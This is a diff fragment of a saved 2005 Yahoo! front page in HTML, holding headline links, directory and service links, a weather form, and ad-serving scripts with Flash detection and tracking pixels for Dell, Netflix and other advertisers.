+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/oi">Search 
+Marketing</A> </DIV></DIV></DIV>
+<DIV class=l id=yf>
+<H2><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/b9">Yahoo! 
+Featured Services</A></H2>
+<DIV class=ct>
+<DIV class=q><A 
+href="http://us.ard.yahoo.com/SIG=12j4jerm7/M=261366.4008387.5258380.3595621/D=yahoo_top/S=2716149:FPC1/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=1798789/R=0/SIG=1124qkssh/*http://geocities.yahoo.com/home/">Personal 
+Website</A><A 
+href="http://us.ard.yahoo.com/SIG=12jnjv2a0/M=351034.6608705.7568495.3595627/D=yahoo_top/S=2716149:FPC4/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2780539/R=0/SIG=13mgvrn8j/*http://football.fantasysports.yahoo.com?ovchn=YAH&amp;ovcpn=Front+Page&amp;ovcrn=FP+Premium+Services+Link&amp;ovrfd=YAH&amp;ovtac=AD">Fantasy 
+Football</A></DIV>
+<DIV class=q2><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/v9">Personals</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/em">HotJobs</A> 
+</DIV></DIV></DIV></DIV>
+<DIV class=l id=e>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ye">Entertainment</A> 
+<SPAN class=m><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yf">» 
+More Entertainment</A></SPAN></H2>
+<DIV class=ct>
+<DIV class=f><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243578"><IMG 
+height=60 alt="Jessica Simpson" src="Yahoo!_files/aliciasilverstone104.jpg" 
+width=104 border=0><BR><CITE>Silverstone Weds</CITE></A></DIV>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243576">Alicia 
+Silverstone's surprise weekend wedding</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243553">Report: 
+Katie Holmes converting to Scientology</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243547">Paris 
+Hilton says she plans to give up public life</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/220598">Today's 
+TV Picks</A> - <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/239703">Comics</A> 
+- <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/220596">Daily 
+Horoscopes</A><BR></DIV></DIV>
+<DIV class=l id=b>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/z5">Buzz 
+Log - What the world is searching for</A> <SPAN class=m><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/z6">» 
+More Buzz</A></SPAN></H2>
+<DIV class=ct>
+<DIV class=f><A id=tpb 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243615"><IMG 
+height=60 alt=Volcano src="Yahoo!_files/0614volcano.jpg" width=104 
+border=0><BR><CITE>Natural Eruption!</CITE></A></DIV>
+<TABLE class=bd cellSpacing=0 cellPadding=0 width="100%" border=0>
+  <TBODY>
+  <TR>
+    <TD colSpan=2><FONT face=arial size=-1>Searches on Mother Nature flow like 
+      molten lava as natural disasters shake up the buzz. <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243616"><FONT 
+      face=verdana size=-2><B>More...</B></FONT></A> </FONT></TD></TR>
+  <TR>
+    <TD colSpan=2><FONT face=verdana size=-2><B>Popular Nature Related 
+      Searches</B></FONT></TD></TR>
+  <TR>
+    <TD class=lh vAlign=top width="50%"><FONT face=verdana size=-2>1. <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243617">Volcano 
+      of Fire</A><BR>2. <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243618">Red 
+      Tide</A> </FONT></TD>
+    <TD class=lh vAlign=top width="50%"><FONT face=verdana size=-2>3. <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243619">Earthquakes</A>&nbsp;<BR>4. 
+      <A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243620">Nat'l 
+      Hurricane Center</A> </FONT></TD></TR></TBODY></TABLE></DIV></DIV>
+<DIV class=l id=wd>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/xd">Yahoo! 
+Web Directory</A> <SPAN class=m><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yd">» 
+More Yahoo! Web Directory</A></SPAN></H2>
+<DIV class=ct>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ar">Arts</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/bu">Business</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ci">Computers</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ed">Education</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/en">Entertainment</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/he">Health</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/nm">News</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/rs">Recreation</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/rf">Reference</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/re">Regional</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/sc">Science</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cu">Society</A> 
+</DIV></DIV></DIV>
+<DIV class=l id=mo>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/xz">More 
+Yahoo! Services</A> <SPAN class=m><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/yz">» 
+More Yahoo! Services</A></SPAN></H2>
+<DIV class=ct>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/a2">Auctions</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/bc">Briefcase</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ca">Calendar</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cf">Classifieds</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/do">Downloads</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/eu">Education</A> 
+</DIV>
+<DIV class=u><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/gr">Greetings</A> 
+<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/pf">Members</A> 
+</DIV></DIV></DIV></DIV>
+<SCRIPT language=javascript>
+now=new Date;
+t3=now.getTime();
+</SCRIPT>
+
+<DIV id=c2>
+<DIV id=em>
+<SCRIPT language=javascript>
+r0='http://us.ard.yahoo.com/SIG=12ium8bt6/M=342139.6205135.7615880.3593788/D=yahoo_top/S=2716149:NBM/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796150/R=0/*';
+</SCRIPT>
+
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['c1rlFNibyQg-']='&U=138p9ckc4%2fN%3dc1rlFNibyQg-%2fC%3d342139.6205135.7615880.3593788%2fD%3dNBM%2fB%3d2796150';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAZQLSLR.gif" 
+width=1></NOSCRIPT>
+<SCRIPT language=javascript> 
+var cap=0,nfv=6; 
+var red=r0.substring(0,r0.length-5); 
+var ired='http://landingstrip.dell.com/landingstrip/ls.asp?CID=7537&LID=214653&DGC=DC&DGStor=BSD&DGSite=YAH&Conum=12&K=FEE&DURL=http://www1.us.dell.com/content/products/features.aspx/yahoo_hi_jump?c%3Dus%26cs%3D04%26l%3Den%26s%3Dbsd'; 
+var sred=ired; 
+var tred=ired; 
+var text="More for Less. Dell."; 
+var survey='http://surveys.yahoo.com/survey_product?source=dell_050614'; 
+var dir='http://us.a1.yimg.com/us.yimg.com/a/1-/flash/promotions/dell/050614/'; 
+var img=dir+'100fe.gif'; 
+var swf=dir+'100fe.swf?clickTAG=javascript:swfAction()'; 
+function swfAction() { 
+location.href=red+'R=0/id=flash/*'+sred; 
+} 
+img='<A HREF="'+red+'R=1/id=img/*'+ired+'"><IMG SRC="'+img+'" WIDTH=300 HEIGHT=100 BORDER=0 alt="'+text+'"></A>'; 
+var plugin = (window.navigator.plugins["Shockwave Flash"]) ? window.navigator.plugins["Shockwave Flash"].description : 0; 
+if (plugin) { 
+if (plugin.charAt(plugin.indexOf('.')-1)>=nfv) cap=1; 
+} 
+else if (window.navigator.userAgent.indexOf("MSIE ")>=0 && window.navigator.userAgent.indexOf("Windows")>=0) { 
+document.write('<script language=vbscript\>\non error resume next\ncap=(IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash."&nfv)))\n\</script\>\n'); 
+} 
+document.write('<table border=0 width=300 cellpadding=0 cellspacing=0><tr><td align=center>'); 
+if (cap) { 
+document.write('<OBJECT name=swf classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" WIDTH=300 HEIGHT=100><PARAM NAME=movie VALUE="'+swf+'"><PARAM NAME=loop VALUE=true><PARAM NAME=quality VALUE=autohigh><embed src='+swf+' loop=false menu=false quality=high width=300 height=100 type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash"></embed></object>'); 
+} else { 
+document.write(img); 
+} 
+document.write('</td></tr><tr><td align=center><font face=verdana size=-2><b><a href="'+red+'R=3/id=txt/*'+tred+'">'+text+'</a></b> - <a href="'+red+'R=2/id=survey/*'+survey+'" target="_blank">Ad Feedback</a></font></td></tr></table>'); 
+</SCRIPT>
+
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['dFrlFNibyQg-']='&U=138q3353k%2fN%3ddFrlFNibyQg-%2fC%3d342139.6657758.7615883.3593787%2fD%3dNB1%2fB%3d2796152';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAHBV5SS.gif" 
+width=1></NOSCRIPT></DIV>
+<DIV class=r id=n>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/d2">In 
+the News</A><SMALL class=m>&nbsp;<SPAN id=nw></SPAN></SMALL></H2>
+<SCRIPT language=javascript>d.getElementById('nw').innerHTML=time;</SCRIPT>
+
+<DIV class=ct>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243643">Iraq 
+Shiite gov't gets vote of confidence</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243645">Memo 
+suggests Annan oil-for-food link</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243644">S. 
+African deputy ousted in corruption scandal</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243646">N.J. 
+court rules against same-sex couples</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243647">Politicians 
+rally for struggling Amtrak</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/239901">Pundits 
+ponder Michael Jackson's future</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243642">Army 
+deserter back in U.S. 40 years later</A><BR>•&nbsp;<A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/s/243641">Geldof 
+angry at sale of Live 8 tickets on eBay</A><BR>
+<DIV id=mt><SPAN class=f><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/f3">Markets</A>:<BR>Dow 
+<SPAN class=up>+0.1%</SPAN> · Nasdaq <SPAN class=dn>-0.2%</SPAN></SPAN><SPAN 
+class=m>
+<FORM title="Enter stock ticker symbol" name=fq 
+action=r/f4/*-http://finance.yahoo.com/q><A id=sq 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/f4">Stock 
+Quotes:</A><BR><INPUT size=8 name=s> 
+<INPUT class=s2 type=submit value=Go></FORM></SPAN></DIV>
+<DIV id=nl><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/xn">News</A> 
+· <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/me">Popular</A> 
+· <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/s2">Sports</A> 
+· <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/f2">Stocks</A> 
+</DIV></DIV></DIV>
+<DIV class=r id=w>
+<H2><SPAN class=f id=wt><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/wt">Weather</A></SPAN> 
+<SPAN class=m><A id=ca onclick="cl();return false" 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/w1">» 
+Change Location</A></SPAN></H2>
+<DIV class=ct id=lc>
+<FORM name=w onsubmit="return gw(this)" 
+action=r/w8/*-http://weather.yahoo.com/search/weather2>
+<DIV id=wa></DIV><LABEL class=np for=zi><SPAN id=wg>Enter City or U.S. Zip 
+Code</SPAN></LABEL> 
+<DIV><SPAN id=z><INPUT id=zi name=p></SPAN> <SPAN id=ws><INPUT class=s2 type=submit value=Go></SPAN> </DIV>
+<DIV class=wa></DIV><SPAN class=wa><INPUT id=we type=checkbox CHECKED value=on 
+name=sv> <LABEL for=we>Save location on this page</LABEL></SPAN> 
+</FORM></DIV></DIV>
+<DIV class=r id=k>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/0v">Marketplace</A></H2>
+<DIV class=ct>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+  <TBODY>
+  <TR>
+    <TD vAlign=top><A 
+      href="http://us.ard.yahoo.com/SIG=12hthejh6/M=321828.5579371.7616124.2060751/D=yahoo_top/S=2716149:M2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796311/R=0/SIG=11u70rb7c/*http://clk.atdmt.com/NFX/go/yhxxxnfx0020000392nfx/direct/01/"><IMG 
+      height=70 src="Yahoo!_files/netflix0421.gif" width=70 border=0></A></TD>
+    <TD width=8>&nbsp;</TD>
+    <TD vAlign=top><FONT face=arial size=-1><A 
+      href="http://us.ard.yahoo.com/SIG=12hthejh6/M=321828.5579371.7616124.2060751/D=yahoo_top/S=2716149:M2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796311/R=1/SIG=11u70rb7c/*http://clk.atdmt.com/NFX/go/yhxxxnfx0020000392nfx/direct/01/">Netflix 
+      - only $9.99/month</A><BR>DVD rentals delivered to you – No late fees – 
+      Free shipping – 40,000+ titles. Try free.</FONT></TD></TR></TBODY></TABLE>
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['dVrlFNibyQg-']='&U=137ljcfs1%2fN%3ddVrlFNibyQg-%2fC%3d321828.5579371.7616124.2060751%2fD%3dM2%2fB%3d2796311';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CA8NHBEM.gif" 
+width=1></NOSCRIPT>
+<HR noShade SIZE=1>
+<A 
+href="http://us.ard.yahoo.com/SIG=12hbkp7rt/M=323121.5622285.7616231.5020688/D=yahoo_top/S=2716149:T2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796365/R=0/SIG=11uid2i42/*http://clk.atdmt.com/NYF/go/yhxxxkap0030000049nyf/direct/01/">Interested 
+in Law Enforcement?</A> - Get your Criminal Justice degree online.
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['dlrlFNibyQg-']='&U=137m1du63%2fN%3ddlrlFNibyQg-%2fC%3d323121.5622285.7616231.5020688%2fD%3dT2%2fB%3d2796365';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAD93FRB.gif" 
+width=1></NOSCRIPT>
+<HR noShade SIZE=1>
+<A noshade size="1" <hr><A 
+href="http://us.ard.yahoo.com/SIG=12h2ejdlg/M=320917.5821125.7616156.5020688/D=yahoo_top/S=2716149:T2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796325/R=0/SIG=1222n689j/*http://www.lowermybills.com/lre/index.jsp?sourceid=lmb-3676-4985">Attention: 
+Mortgage rates fell</A> - $175,000 mortgage for under $860/month.
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['d1rlFNibyQg-']='&U=137a92k19%2fN%3dd1rlFNibyQg-%2fC%3d320917.5821125.7616156.5020688%2fD%3dT2%2fB%3d2796325';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAH6VHX2.gif" 
+width=1></NOSCRIPT>
+<HR noShade SIZE=1>
+<A 
+href="http://us.ard.yahoo.com/SIG=12h88s7vn/M=353491.6549852.7616235.5020688/D=yahoo_top/S=2716149:T2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796377/R=0/SIG=11a04su23/*http://www.rent.com/enter/?source=261880">Rent.com</A> 
+- Find apartments, renters and moving quotes for free - <A 
+href="http://us.ard.yahoo.com/SIG=12h88s7vn/M=353491.6549852.7616235.5020688/D=yahoo_top/S=2716149:T2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796377/R=1/SIG=11a04su23/*http://www.rent.com/enter/?source=261880">$100 
+reward</A>.
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['eFrlFNibyQg-']='&U=137nstl2p%2fN%3deFrlFNibyQg-%2fC%3d353491.6549852.7616235.5020688%2fD%3dT2%2fB%3d2796377';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CAITULWT.gif" 
+width=1></NOSCRIPT>
+<HR noShade SIZE=1>
+<A 
+href="http://us.ard.yahoo.com/SIG=12hpe6s7a/M=351201.6626331.7616210.5020688/D=yahoo_top/S=2716149:T2/_ylt=ArPtIkITlN9hmb.jSz8wDez1cSkA/Y=YAHOO/EXP=1118774771/A=2796356/R=0/SIG=127pq5aac/*http://www.partner2profit.com/redir.cfm?ccode=72FADE5C&amp;pcode=CCE979E8">It’s 
+swimsuit season. Reduce cellulite in as little as 2 weeks - Free trial</A>.
+<SCRIPT language=javascript>
+if(window.yzq_d==null)window.yzq_d=new Object();
+window.yzq_d['eVrlFNibyQg-']='&U=137r4jkfp%2fN%3deVrlFNibyQg-%2fC%3d351201.6626331.7616210.5020688%2fD%3dT2%2fB%3d2796356';
+</SCRIPT>
+<NOSCRIPT><IMG height=1 alt="" src="Yahoo!_files/CA41ANSP.gif" 
+width=1></NOSCRIPT></DIV></DIV>
+<DIV class=r id=g>
+<H2><A class=f 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/wl">Yahoo! 
+International</A></H2>
+<DIV class=ct>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" border=0>
+  <TBODY>
+  <TR>
+    <TD vAlign=top width="33%"><FONT face=arial size=-1><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/id">India</A><BR><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cc">China</A></FONT></TD>
+    <TD vAlign=top width="33%"><FONT face=arial size=-1><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ru">Y! 
+      in Russian</A><BR><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/uk">UK 
+      &amp; Ireland</A></FONT></TD>
+    <TD vAlign=top width="33%"><FONT face=arial size=-1><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ai">Asia</A><BR><A 
+      href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ep">Y! 
+      en español</A></FONT></TD></TR></TBODY></TABLE>
+<DIV class=m><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/wr">» 
+See all Yahoo! international sites</A></DIV></DIV></DIV></DIV></DIV>
+<DIV id=f><SPAN class=f id=foot><A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ad">How 
+to Suggest a Site</A> | <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/cp">Company 
+Info</A> | <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/pv">Privacy 
+Policy</A> | <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ts">Terms 
+of Service</A> | <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/hr">Jobs</A> 
+| <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/ao">Advertise 
+With Us</A> | <A 
+href="http://www.yahoo.com/_ylh=X3oDMTB2MXQ5MTU3BF9TAzI3MTYxNDkEdGVzdAMwBHRtcGwDaW5kZXgtaWU-/r/hw">Help</A> 
